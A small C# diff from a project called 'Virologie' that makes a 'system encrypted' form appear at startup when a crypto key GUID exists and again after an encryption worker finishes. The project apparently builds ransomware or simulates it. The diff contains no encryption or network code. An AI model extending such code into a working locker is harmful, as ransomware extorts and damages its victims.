@@ -19,6 +19,9 @@ namespace Virologie
         {
             InitializeComponent();
 
+            if (CryptoKeyManager.guid != Guid.Empty)
+                ShowSeForm();
+
             worker = new EncryptWorker();
             worker.RunWorkerCompleted += worker_RunWorkerCompleted;
             worker.ProgressChanged += worker_ProgressChanged;
@@ -44,6 +47,11 @@ namespace Virologie
             }
 
             progressBar1.Value = 100;
+            ShowSeForm();
+        }
+
+        private static void ShowSeForm()
+        {
             var seForm = new SystemEncrytedForm();
             seForm.Show();
         }
